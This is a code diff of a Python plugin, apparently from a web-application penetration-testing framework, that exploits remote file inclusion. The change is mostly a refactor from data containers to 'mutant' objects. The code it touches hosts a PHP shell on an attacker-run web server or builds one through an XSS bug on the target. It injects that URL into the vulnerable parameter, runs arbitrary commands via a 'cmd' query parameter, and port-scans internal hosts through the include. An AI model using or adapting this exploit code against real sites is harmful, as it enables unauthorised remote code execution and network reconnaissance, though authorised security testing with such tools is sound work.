@@ -56,7 +56,7 @@ class rfi(AttackPlugin):
 
         # Internal variables
         self._xss_vuln = None
-        self._exploit_dc = None
+        self._exploit_mutant = None
 
         # User configured variables
         self._listen_port = ports.RFI_SHELL
@@ -107,7 +107,8 @@ class rfi(AttackPlugin):
             # fails
             webroot_path = os.path.join(get_home_dir(), 'webroot')
             try:
-                webserver.start_webserver(self._listen_address, self._listen_port,
+                webserver.start_webserver(self._listen_address,
+                                          self._listen_port,
                                           webroot_path)
             except socket.error, se:
                 msg = 'Failed to start the local web server to exploit the'\
@@ -131,22 +132,23 @@ class rfi(AttackPlugin):
             om.out.console(msg)
 
         #
-        #    I have some XSS vulns, lets see if they have what we need
+        # I have some XSS vulns, lets see if they have what we need
         #
+        # Set the test string
+        test_string = '<?#@!()&=?>'
 
         for xss_vuln in xss_vulns:
-            # Set the test string
-            test_string = '<?#@!()&=?>'
+
+            if xss_vuln.get_mutant().get_method() != 'GET':
+                continue
 
             # Test if the current xss vuln works for us:
-            function_reference = getattr(
-                self._uri_opener, xss_vuln.get_method())
-            data_container = xss_vuln.get_dc()
-            data_container[xss_vuln.get_var()] = test_string
+            xss_mutant = xss_vuln.get_mutant()
+            xss_mutant = xss_mutant.copy()
+            xss_mutant.set_token_value(test_string)
 
             try:
-                http_res = function_reference(
-                    xss_vuln.get_url(), str(data_container))
+                http_res = self._uri_opener.send_mutant(xss_mutant)
             except:
                 continue
             else:
@@ -174,15 +176,15 @@ class rfi(AttackPlugin):
     def get_kb_location(self):
         """
         This method should return the vulnerability name (as saved in the kb)
-        to exploit. For example, if the audit.os_commanding plugin finds an vuln,
+        to exploit. For example, if the audit.os_commanding plugin finds an vuln
         and saves it as:
 
         kb.kb.append( 'os_commanding' , 'os_commanding', vuln )
 
-        Then the exploit plugin that exploits os_commanding ( attack.os_commanding )
-        should return 'os_commanding' in this method.
+        Then the exploit plugin that exploits os_commanding
+        (attack.os_commanding) should return 'os_commanding' in this method.
         """
-        return ['rfi',]
+        return ['rfi']
 
     def _generate_shell(self, vuln_obj):
         """
@@ -195,7 +197,7 @@ class rfi(AttackPlugin):
 
             # Create the shell object
             shell_obj = RFIShell(vuln_obj, self._uri_opener,
-                                 self.worker_pool, self._exploit_dc)
+                                 self.worker_pool, self._exploit_mutant)
             return shell_obj
 
         elif exploit_success == SUCCESS_OPEN_PORT:
@@ -221,8 +223,8 @@ class rfi(AttackPlugin):
 
         for file_content, real_extension in shell_list:
             #
-            #    This for loop aims to exploit the RFI vulnerability and get remote
-            #    code execution.
+            # This for loop aims to exploit the RFI vulnerability and get remote
+            # code execution.
             #
             if extension == '':
                 extension = real_extension
@@ -230,39 +232,35 @@ class rfi(AttackPlugin):
             url_to_include = self._gen_url_to_include(file_content, extension)
 
             # Prepare for exploitation...
-            function_reference = getattr(self._uri_opener, vuln.get_method())
-            data_container = vuln.get_dc()
-            data_container[vuln.get_var()] = url_to_include
+            mutant = vuln.get_mutant()
+            mutant = mutant.copy()
+            mutant.set_token_value(url_to_include)
 
             try:
-                http_res = function_reference(vuln.get_url(),
-                                              str(data_container))
+                http_res = self._uri_opener.send_mutant(mutant)
             except:
                 continue
             else:
                 if shell_handler.SHELL_IDENTIFIER in http_res.body:
-                    self._exploit_dc = data_container
+                    self._exploit_mutant = mutant
                     return SUCCESS_COMPLETE
                 else:
                     # Remove the file from the local webserver webroot
                     self._rm_file(url_to_include)
 
         else:
-
             #
             #  We get here when it was impossible to create a RFI shell, but we
             #  still might be able to do some interesting stuff through error
             #  messages shown by the web application  
             #
-            function_reference = getattr(self._uri_opener, vuln.get_method())
-            data_container = vuln.get_dc()
-
-            #    A port that should "always" be closed,
-            data_container[vuln.get_var()] = 'http://localhost:92/'
+            mutant = vuln.get_mutant()
+            mutant = mutant.copy()
+            # A port that should "always" be closed
+            mutant.set_token_value('http://localhost:92/')
 
             try:
-                http_response = function_reference(
-                    vuln.get_url(), str(data_container))
+                http_response = self._uri_opener.send_mutant(mutant)
             except:
                 return False
             else:
@@ -280,12 +278,11 @@ class rfi(AttackPlugin):
         URL pointing to a XSS bug, or our local webserver.
         """
         if self._use_XSS_vuln and self._xss_vuln:
-            url = self._xss_vuln.get_url().uri2url()
-            data_container = self._xss_vuln.get_dc()
-            data_container = data_container.copy()
-            data_container[self._xss_vuln.get_var()] = file_content
-            url_to_include = url + '?' + str(data_container)
-            return url_to_include
+            mutant = self._xss_vuln.get_mutant()
+            mutant = mutant.copy()
+            mutant.set_token_value(file_content)
+            return mutant.get_uri().url_string
+
         else:
             # Write the php to the webroot
             filename = rand_alnum()
@@ -365,8 +362,8 @@ class rfi(AttackPlugin):
         in which the file to be included is hosted on a webserver that the plugin
         runs, or a nicer approach, in which a XSS bug on the remote site is used
         to generate the remote file to be included. Both ways work and return a
-        shell, but the one that uses XSS will work even when a restrictive firewall
-        is configured at the remote site.
+        shell, but the one that uses XSS will work even when a restrictive
+        firewall is configured at the remote site.
 
         Four configurable parameters exist:
             - listen_address
@@ -391,14 +388,12 @@ class PortScanShell(Shell):
         """
         :return: True if the host:port is open.
         """
-        port_open_dc = self.get_dc()
-        port_open_dc = port_open_dc.copy()
-        port_open_dc[self.get_var()] = 'http://%s:%s/' % (host, port)
+        mutant = self.get_mutant()
+        mutant = mutant.copy()
+        mutant.set_token_value('http://%s:%s/' % (host, port))
 
-        function_reference = getattr(self._uri_opener, self.get_method())
         try:
-            http_response = function_reference(
-                self.get_url(), str(port_open_dc))
+            http_response = self._uri_opener.send_mutant(mutant)
         except BaseFrameworkException, w3:
             return 'Exception from the remote web application: "%s"' % w3
         except Exception, e:
@@ -425,41 +420,41 @@ class PortScanShell(Shell):
 
 class RFIShell(ExecShell, PortScanShell):
     """
-    I create this shell when the remote host allows outgoing connections, or when
-    the attack plugin was configured to use XSS vulnerabilities to exploit the
-    RFI and a XSS vulnerability was actually found.
+    I create this shell when the remote host allows outgoing connections, or
+    when the attack plugin was configured to use XSS vulnerabilities to exploit
+    the RFI and a XSS vulnerability was actually found.
     """
-    def __init__(self, vuln, uri_opener, worker_pool, exploit_dc):
+    def __init__(self, vuln, uri_opener, worker_pool, exploit_mutant):
         """
         Create the obj
         """
         PortScanShell.__init__(self, vuln, uri_opener, worker_pool)
         ExecShell.__init__(self, vuln, uri_opener, worker_pool)
 
-        self._exploit_dc = exploit_dc
+        self._exploit_mutant = exploit_mutant
 
     @exec_debug
     def execute(self, command):
         """
-        This method is called when a user writes a command in the shell and hits enter.
+        This method is called when a user writes a command in the shell and hits
+        enter.
 
-        Before calling this method, the framework calls the generic_user_input method
-        from the shell class.
+        Before calling this method, the framework calls the generic_user_input
+        method from the shell class.
 
         :param command: The command to handle ( ie. "read", "exec", etc ).
         :return: The result of the command.
         """
-        e_dc = self._exploit_dc
-        e_dc = e_dc.copy()
-        e_dc['cmd'] = command
+        mutant = self._exploit_mutant.copy()
+        uri = mutant.get_uri()
+        uri.querystring.update([('cmd', [command])])
 
-        function_reference = getattr(self._uri_opener, self.get_method())
         try:
-            http_res = function_reference(self.get_url(), str(e_dc))
+            http_res = self._uri_opener.send_mutant(mutant)
         except BaseFrameworkException, w3:
-            return 'Exception from the remote web application:' + str(w3)
+            return 'Exception from the remote web application: "%s"' % w3
         except Exception, e:
-            return 'Unhandled exception from the remote web application:' + str(e)
+            return 'Unhandled exception from the remote web application: "%s"' % e
         else:
             return shell_handler.extract_result(http_res.get_body())
 
@@ -469,7 +464,7 @@ class RFIShell(ExecShell, PortScanShell):
         """
         om.out.debug('Remote file inclusion shell is cleaning up.')
         try:
-            self._rm_file(self._exploit_dc[self.get_var()])
+            self._rm_file(self._exploit_mutant.get_token_value())
         except Exception, e:
             msg = 'Remote file inclusion shell cleanup failed with exception: %s'
             om.out.error(msg % e)
